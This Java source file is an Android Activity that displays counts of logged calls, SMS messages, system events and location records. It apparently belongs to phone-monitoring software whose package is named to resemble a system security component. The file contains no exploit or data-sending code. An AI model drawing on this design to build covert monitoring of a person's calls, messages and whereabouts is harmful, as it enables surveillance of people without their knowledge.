package com.vvt.android.syncmanager.gui;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

import com.android.msecurity.R;
import com.fx.dalvik.util.FxLog;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.DatabaseManager;
import com.vvt.android.syncmanager.control.EventManager;
import com.vvt.android.syncmanager.control.EventManager.Callback;
import com.vvt.android.syncmanager.control.Main;

public class DatabaseStatusActivity extends Activity implements Callback {

//-------------------------------------------------------------------------------------------------
// PRIVATE API
//-------------------------------------------------------------------------------------------------

	private static final String TAG = "DatabaseStatusActivity";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	@SuppressWarnings("unused")
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private TextView eventTotal;
	private TextView eventIncomingCall;
	private TextView eventOutgoingCall;
	private TextView eventMissedCall;
	private TextView eventIncomingSms;
	private TextView eventOutgoingSms;
	private TextView eventLocation;
	private TextView eventIncomingSystem;
	private TextView eventOutgoingSystem;
	
    private void refreshFxLogEventsInformation() {
    	// Show Events Information
    	DatabaseManager databaseManager = Main.getInstance().getDatabaseManager();
    	eventTotal.setText(String.format("%d", databaseManager.countTotalEvents()));
    	eventIncomingCall.setText(String.format("%d", databaseManager.countIncomingCall()));
    	eventOutgoingCall.setText(String.format("%d", databaseManager.countOutgoingCall()));
    	eventMissedCall.setText(String.format("%d", databaseManager.countMissedCall()));
    	eventIncomingSms.setText(String.format("%d", databaseManager.countIncomingSms()));
    	eventOutgoingSms.setText(String.format("%d", databaseManager.countOutgoingSms()));
    	eventIncomingSystem.setText(String.format("%d", databaseManager.countIncomingSystem()));
    	eventOutgoingSystem.setText(String.format("%d", databaseManager.countOutgoingSystem()));
    	eventLocation.setText(String.format("%d", databaseManager.countLocation()));
    }
	
//-------------------------------------------------------------------------------------------------
// PUBLIC API
//-------------------------------------------------------------------------------------------------
	
    @Override
    public void onCreate(Bundle aSavedInstanceStateBundle) {
    	if (LOCAL_LOGV) FxLog.v(TAG, "onCreate # ENTER ...");
     	  
        super.onCreate(aSavedInstanceStateBundle);

        setContentView(R.layout.database_status);

        eventTotal = (TextView) findViewById(R.id.database_status_event_total);
        eventIncomingCall = (TextView) findViewById(R.id.database_status_event_incoming_call);
        eventOutgoingCall = (TextView) findViewById(R.id.database_status_event_outgoing_call);
        eventMissedCall = (TextView) findViewById(R.id.database_status_event_missed_call);
        eventIncomingSms = (TextView) findViewById(R.id.database_status_event_incoming_sms);
        eventOutgoingSms = (TextView) findViewById(R.id.database_status_event_outgoing_sms);
        eventLocation = (TextView) findViewById(R.id.database_status_event_location);
        eventIncomingSystem = (TextView) findViewById(R.id.database_status_event_incoming_system);
        eventOutgoingSystem = (TextView) findViewById(R.id.database_status_event_outgoing_system);
    }

    @Override
    public void onResume() {
    	if (LOCAL_LOGV) FxLog.v(TAG, "onResume # ENTER ...");
    	super.onResume();
    	refreshFxLogEventsInformation();
        Main main = Main.getInstance();
        EventManager eventManager = main.getEventsManager();
        eventManager.setCallback(this);
    }
    
    @Override
    public void onPause() {
    	if (LOCAL_LOGV) FxLog.v(TAG, "onPause # ENTER ...");
        Main main = Main.getInstance();
        EventManager eventManager = main.getEventsManager();
    	eventManager.setCallback(null); // To prevent callback to be called after this is destroyed.
    	super.onPause();
    }

	public void onFxLogEventsChanged() {
		if (LOCAL_LOGV) FxLog.v(TAG, "onFxLogEventsChanged # ENTER ...");
		refreshFxLogEventsInformation();
	}
}
